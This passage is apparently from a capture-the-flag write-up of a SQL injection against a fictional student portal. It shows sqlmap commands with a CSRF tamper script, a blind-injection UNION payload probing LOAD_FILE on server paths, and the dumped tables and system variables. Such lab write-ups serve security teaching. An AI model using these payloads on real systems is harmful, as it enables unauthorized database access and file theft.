<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">Error: <span style="color:#ff79c6">INSERT</span> <span style="color:#ff79c6">INTO</span> applications (name, elfmail, program, phone, whyme, essay, status) <span style="color:#ff79c6">VALUES</span> (<span style="color:#f1fa8c">&#39;aaaaaa&#39;</span>, <span style="color:#f1fa8c">&#39;a@a.com&#39;</span>, <span style="color:#f1fa8c">&#39;a&#39;</span>, <span style="color:#f1fa8c">&#39;55555555&#39;</span>, <span style="color:#f1fa8c">&#39;w&#39;</span>, <span style="color:#f1fa8c">&#39;qwertyuiop&#39;</span>, <span style="color:#f1fa8c">&#39;pending&#39;</span>)
Duplicate entry <span style="color:#f1fa8c">&#39;a@a.com&#39;</span> <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">key</span> <span style="color:#f1fa8c">&#39;elfmail&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>A website that shows such a log is terrible as it gives way to much information on the underlying database backent and model.</p>
<p>Obviously someone registered before me with &lsquo;<a href="mailto:a@a.com">a@a.com</a>&rsquo; so I&rsquo;ll just check the application status with this email address.
Instead of submitting the email address alone, I have added a simple quote <code>'a@a.com</code> and an error message is showing:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">Error: <span style="color:#ff79c6">SELECT</span> status <span style="color:#ff79c6">FROM</span> applications <span style="color:#ff79c6">WHERE</span> elfmail <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>a<span style="color:#ff79c6">@</span>a.com<span style="color:#f1fa8c">&#39;;
</span><span style="color:#f1fa8c">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;</span>a<span style="color:#ff79c6">@</span>a.com<span style="color:#f1fa8c">&#39;&#39;</span> <span style="color:#ff79c6">at</span> line <span style="color:#bd93f9">1</span>
</code></pre></td></tr></table>
</div>
</div><p>Definitely a SQLI vulnerability that should be exploitable.
Instead of using SQLMAP tool that automates the job, I want to try to break it manually.</p>
<p>First let&rsquo;s try to get the application status with a SQLI and without getting an error message with: <code>'a@a.com';</code>.
The web page has some javascript that check the format of my email address and prompt us <code>Please enter a valid email address</code>.</p>
<p>We can use burp-suite to by-pass this control, but developer tools should be enough.
I find the javascript function <code>submitApplication()</code> which itself calls the function <code>elfsign()</code>
which sends an XmlHttpRequest with /validator.php &hellip;</p>
<p>it sounds like it provides a token that will be checked on server side.
This make our task a bit more complicated.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">    <span style="color:#ff79c6">&lt;</span>script<span style="color:#ff79c6">&gt;</span>

    <span style="color:#8be9fd;font-style:italic">function</span> submitApplication() {
      console.log(<span style="color:#f1fa8c">&#34;Submitting&#34;</span>);
      elfSign();
      <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#34;check&#34;</span>).submit();
    }
    <span style="color:#8be9fd;font-style:italic">function</span> elfSign() {
      <span style="color:#8be9fd;font-style:italic">var</span> s <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#34;token&#34;</span>);

      <span style="color:#ff79c6">const</span> Http <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> XMLHttpRequest();
      <span style="color:#ff79c6">const</span> url<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;/validator.php&#39;</span>;
      Http.open(<span style="color:#f1fa8c">&#34;GET&#34;</span>, url, <span style="color:#ff79c6">false</span>);
      Http.send(<span style="color:#ff79c6">null</span>);

      <span style="color:#ff79c6">if</span> (Http.status <span style="color:#ff79c6">===</span> <span style="color:#bd93f9">200</span>) {
        console.log(Http.responseText);
        s.value <span style="color:#ff79c6">=</span> Http.responseText;
      }

    }

    <span style="color:#ff79c6">&lt;</span>/script&gt;
</code></pre></td></tr></table>
</div>
</div><p>I have created a simple python script <a href="./sqli.py">sqli.py</a> to perform a Blin Sql Injection &hellip;
but SqlMap is so much more efficient.</p>
<p>Let&rsquo;s enumerate the schemas:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python sqlmap.py -u https://studentportal.elfu.org/application-check.php?elfmail<span style="color:#ff79c6">=</span>q -p elfmail --tamper<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;csrf_proxy.py&#34;</span> --regex<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Congratulations|still pending&#34;</span> --risk<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span>  --skip-urlencode --technique<span style="color:#ff79c6">=</span>B --level<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span> --dbms<span style="color:#ff79c6">=</span>MySQL --exclude-sysdbs --dbs
available databases <span style="color:#ff79c6">[</span>2<span style="color:#ff79c6">]</span>:
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> elfu
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> information_schema
</code></pre></td></tr></table>
</div>
</div><p>Now let&rsquo;s enumerate the tables:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python sqlmap.py -u https://studentportal.elfu.org/application-check.php?elfmail<span style="color:#ff79c6">=</span>q -p elfmail --tamper<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;csrf_proxy.py&#34;</span> --regex<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Congratulations|still pending&#34;</span> --risk<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span>  --skip-urlencode --technique<span style="color:#ff79c6">=</span>B --level<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span> --dbms<span style="color:#ff79c6">=</span>MySQL --exclude-sysdbs -D elfu --tables
Database: elfu
<span style="color:#ff79c6">[</span><span style="color:#bd93f9">3</span> tables<span style="color:#ff79c6">]</span>
+--------------+
| applications |
| krampus      |
| students     |
+--------------+
</code></pre></td></tr></table>
</div>
</div><p><strong>Krampus</strong> table sounds sweet and interesting. Now we can fetch the columns of those tables:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python sqlmap.py -u https://studentportal.elfu.org/application-check.php?elfmail<span style="color:#ff79c6">=</span>q -p elfmail --tamper<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;csrf_proxy.py&#34;</span> --regex<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Congratulations|still pending&#34;</span> --risk<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span>  --skip-urlencode --technique<span style="color:#ff79c6">=</span>B --level<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span> --dbms<span style="color:#ff79c6">=</span>MySQL --exclude-sysdbs -D elfu -T krampus,students --columns
Database: elfu
Table: krampus
<span style="color:#ff79c6">[</span><span style="color:#bd93f9">2</span> columns<span style="color:#ff79c6">]</span>
+--------+-------------+
| Column | Type        |
+--------+-------------+
| path   | varchar<span style="color:#ff79c6">(</span>30<span style="color:#ff79c6">)</span> |
| id     | int<span style="color:#ff79c6">(</span>11<span style="color:#ff79c6">)</span>     |
+--------+-------------+

Database: elfu
Table: students
<span style="color:#ff79c6">[</span><span style="color:#bd93f9">5</span> columns<span style="color:#ff79c6">]</span>
+----------------+--------------+
| Column         | Type         |
+----------------+--------------+
| bio            | varchar<span style="color:#ff79c6">(</span>300<span style="color:#ff79c6">)</span> |
| degree         | varchar<span style="color:#ff79c6">(</span>30<span style="color:#ff79c6">)</span>  |
| id             | int<span style="color:#ff79c6">(</span>11<span style="color:#ff79c6">)</span>      |
| name           | varchar<span style="color:#ff79c6">(</span>30<span style="color:#ff79c6">)</span>  |
| student_number | varchar<span style="color:#ff79c6">(</span>30<span style="color:#ff79c6">)</span>  |
+----------------+--------------+
</code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s dump krampus table:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python sqlmap.py -u https://studentportal.elfu.org/application-check.php?elfmail<span style="color:#ff79c6">=</span>q -p elfmail --tamper<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;csrf_proxy.py&#34;</span> --regex<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Congratulations|still pending&#34;</span> --risk<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span>  --skip-urlencode --technique<span style="color:#ff79c6">=</span>B --level<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span> --dbms<span style="color:#ff79c6">=</span>MySQL --exclude-sysdbs -D elfu -T krampus --dump
tabase: elfu
Table: krampus
<span style="color:#ff79c6">[</span><span style="color:#bd93f9">6</span> entries<span style="color:#ff79c6">]</span>
+----+-----------------------+
| id | path                  |
+----+-----------------------+
| <span style="color:#bd93f9">1</span>  | /krampus/0f5f510e.png |
| <span style="color:#bd93f9">2</span>  | /krampus/1cc7e121.png |
| <span style="color:#bd93f9">3</span>  | /krampus/439f15e6.png |
| <span style="color:#bd93f9">4</span>  | /krampus/667d6896.png |
| <span style="color:#bd93f9">5</span>  | /krampus/adb798ca.png |
| <span style="color:#bd93f9">6</span>  | /krampus/ba417715.png |
+----+-----------------------+
</code></pre></td></tr></table>
</div>
</div><p>We attempt to identify the existence of those files in the filesystem.
The below command should return &lsquo;success&rsquo; when the file exists, otherwise &lsquo;no application&rsquo;</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python sqli.py --payload <span style="color:#f1fa8c">&#34;iuiwug&#39; UNION select &#39;completeddfgsfhf&#39; from krampus where LOAD_FILE(&#39;/krampus/0f5f510e.png&#39;) is NOT NULL  %23&#34;</span>  | egrep <span style="color:#f1fa8c">&#34;success|no application&#34;</span>
no application
</code></pre></td></tr></table>
</div>
</div><p>We try the above command for all files but none of them exists in the file system.
Maybe we should look for an exploit or for some system variable limitations?</p>
<p>Let&rsquo;s fetch the MySQL version</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python sqli.py --payload <span style="color:#f1fa8c">&#34;iuiwug&#39; UNION select v from (select VERSION() as v) toto WHERE v like &#39;{1}%25&#39;  %23&#34;</span> --dump any
<span style="color:#f1fa8c">&#39;10.1.43-mariadb-1_bionic&#39;</span>

python sqlmap.py -u https://studentportal.elfu.org/application-check.php?elfmail<span style="color:#ff79c6">=</span>q -p elfmail --tamper<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;csrf_proxy.py&#34;</span> --regex<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Congratulations|still pending&#34;</span> --risk<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span>  --skip-urlencode --technique<span style="color:#ff79c6">=</span>B --level<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span> --dbms<span style="color:#ff79c6">=</span>MySQL --exclude-sysdbs -D information_schema -T system_variables -C VARIABLE_NAME,GLOBAL_VALUE,SESSION_VALUE --dump  --threads<span style="color:#ff79c6">=</span><span style="color:#bd93f9">10</span> --where <span style="color:#f1fa8c">&#34;VARIABLE_NAME LIKE &#39;%version%&#39;&#34;</span>
Database: information_schema
Table: system_variables
<span style="color:#ff79c6">[</span><span style="color:#bd93f9">10</span> entries<span style="color:#ff79c6">]</span>
+-------------------------+---------------------------------+---------------+
| VARIABLE_NAME           | GLOBAL_VALUE                    | SESSION_VALUE |
+-------------------------+---------------------------------+---------------+
| SLAVE_TYPE_CONVERSIONS  | &lt;blank&gt;                         | NULL          |
| PROTOCOL_VERSION        | <span style="color:#bd93f9">10</span>                              | NULL          |
| VERSION                 | 10.1.43-MariaDB-1~bionic        | NULL          |
| INNODB_VERSION          | 5.6.45-86.1                     | NULL          |
| VERSION_COMPILE_OS      | debian-linux-gnu                | NULL          |
| VERSION_COMMENT         | mariadb.org binary distribution | NULL          |
| VERSION_SSL_LIBRARY     | OpenSSL 1.0.2n  <span style="color:#bd93f9">7</span> Dec <span style="color:#bd93f9">2017</span>      | NULL          |
| VERSION_MALLOC_LIBRARY  | system jemalloc                 | NULL          |
| WSREP_PATCH_VERSION     | wsrep_25.24                     | NULL          |
| VERSION_COMPILE_MACHINE | x86_64                          | NULL          |
+-------------------------+---------------------------------+---------------+
</code></pre></td></tr></table>
</div>
</div><p>No exploit available on exploit-db for this version, no CVE vulnerabilities either :(</p>
<p>Any chance download is disabled? Let&rsquo;s see &hellip;</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python sqlmap.py -u https://studentportal.elfu.org/application-check.php?elfmail<span style="color:#ff79c6">=</span>q -p elfmail --tamper<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;csrf_proxy.py&#34;</span> --regex<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Congratulations|still pending&#34;</span> --risk<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span>  --skip-urlencode --technique<span style="color:#ff79c6">=</span>B --level<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span> --dbms<span style="color:#ff79c6">=</span>MySQL --exclude-sysdbs -D information_schema -T system_variables -C VARIABLE_NAME,GLOBAL_VALUE,SESSION_VALUE --dump  --threads<span style="color:#ff79c6">=</span><span style="color:#bd93f9">10</span> --where <span style="color:#f1fa8c">&#34;VARIABLE_NAME LIKE &#39;%secure_file_priv%&#39;&#34;</span>
+------------------+--------------+---------------+
| VARIABLE_NAME    | GLOBAL_VALUE | SESSION_VALUE |
+------------------+--------------+---------------+
| SECURE_FILE_PRIV | &lt;blank&gt;      | NULL          |
+------------------+--------------+---------------+
</code></pre></td></tr></table>
</div>
</div><p>Nope &hellip; IS it because the files are too big, What&rsquo;s the maximum size?</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
